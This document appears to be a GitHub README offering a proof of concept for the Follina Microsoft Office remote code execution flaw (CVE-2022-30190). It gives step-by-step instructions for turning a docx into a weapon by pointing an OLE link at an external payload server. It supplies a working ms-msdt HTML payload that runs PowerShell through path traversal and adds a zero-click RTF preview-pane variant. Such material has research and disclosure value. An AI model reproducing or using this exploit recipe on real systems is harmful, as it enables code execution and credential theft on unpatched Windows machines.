# POC CVE-2022-30190 : CVE 0-day MS Offic RCE aka msdt follina 

> Info : [New Microsoft Office zero-day used in attacks to execute PowerShell](https://www.bleepingcomputer.com/news/security/new-microsoft-office-zero-day-used-in-attacks-to-execute-powershell/)

## Summary 

On the 29th of May 2022, the Nao_Sec team, an independent Cyber Security Research
Team, discovered a malicious Office document shared on Virustotal. This document is
using an unusual, but known scheme to infect its victims. The scheme was not detected as
malicious by some EDR, like Microsoft Defender for Endpoint. This vulnerability could lead to
code execution without the need of user interaction, as it does not involve macros, except if the
Protected View mode is enabled. There is no CVE number attributed yet.


## Technical Details

The vulnerability is being exploited by using the MSProtocol URI scheme to load some code.
Attackers could embed malicious links inside Microsoft Office documents, templates or emails
beginning with ms-msdt: that will be loaded and executed afterward without user interaction
- except if the Protected View mode is enabled. Nevertheless, converting the document to
the RTF format could also bypass the Protected View feature.

## Proof of Concept 

MS Office docx files may contain external OLE Object references as HTML files. There is an HTML sceme "ms-msdt:" which invokes the msdt diagnostic tool, what is capable of executing arbitrary code (specified in parameters).

The result is a terrifying attack vector for getting RCE through opening malicious docx files (without using macros).

Here are the steps to build a Proof-of-Concept docx:

1. Open Word (used up-to-date 2019 Pro, 16.0.10386.20017), create a dummy document, insert an (OLE) object (as a Bitmap Image), save it in docx.

2. Edit `word/_rels/document.xml.rels` in the docx structure (it is a plain zip). Modify the XML tag `<Relationship>` with attribute

```
Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject"
```

and `Target="embeddings/oleObject1.bin"` by changing the `Target` value and adding attribute `TargetMode`:

```
Target = "http://<payload_server>/payload.html!"
TargetMode = "External"
```

Note the Id value (probably it is "rId5").

3. Edit `word/document.xml`. Search for the "<o:OLEObject ..>" tag (with `r:id="rId5"`) and change the attribute from `Type="Embed"` to `Type="Link"` and add the attribute `UpdateMode="OnCall"`.

NOTE: The created malicious docx is almost the same as for [CVE-2021-44444](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444).

4. Serve the PoC (calc.exe launcher) html payload with the ms-msdt scheme at `http://<payload_server>/payload.html`:

```
<!doctype html>
<html lang="en">
<body>
<script>
//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA should be repeated >60 times
  window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=h$(IEX('calc.exe'))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe \"";
</script>

</body>
</html>
```

Note that:
- the comment line with AAA should be repeated >60 times (minimum 4096 bytes).
- At a minimum, two /../ directory traversals were required at the start of the IT_BrowseForFile parameter
- Code wrapped within $() would execute via PowerShell, but spaces would break it
- “.exe” must be the last trailing string present at the end of the IT_BrowseForFile parameter

Additionally, the triggering payload can reach out to remote locations. While this is unlikely to invoke an untrusted binary, the connection will still carry NTLM hashes (which means that the bad actors now have a hash of the victim’s Windows password) that could be used by an adversary for further post-exploitation.

## BONUS (0-click RTF version)

If you also add these elements under the `<o:OLEObject>` element in `word/document.xml` at step 3:

```
<o:LinkType>EnhancedMetaFile</o:LinkType>
<o:LockedField>false</o:LockedField>
<o:FieldCodes>\f 0</o:FieldCodes>
```

then it'll work as RTF also (open the resulting docx and save it as RTF).

With RTF, there is no need to open the file in Word, it is enough to browse to the file and have a look at it in a preview pane. The preview pane triggers the external HTML payload and RCE is there without any clicks.

## Sources :

- https://nao-sec.org/about
- https://www.virustotal.com/gui/file/4a24048f81afbe9fb62e7a6a49adbd1faf41f266b5f9feecdceb567aec096784/detection
- https://gist.github.com/tothi/66290a42896a97920055e50128c9f040 (original code) 
- https://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/
- https://github.com/sinjap/PoC-CVE-2022-30190 (additional information) 
- https://github.com/JohnHammond/msdt-follina (script)
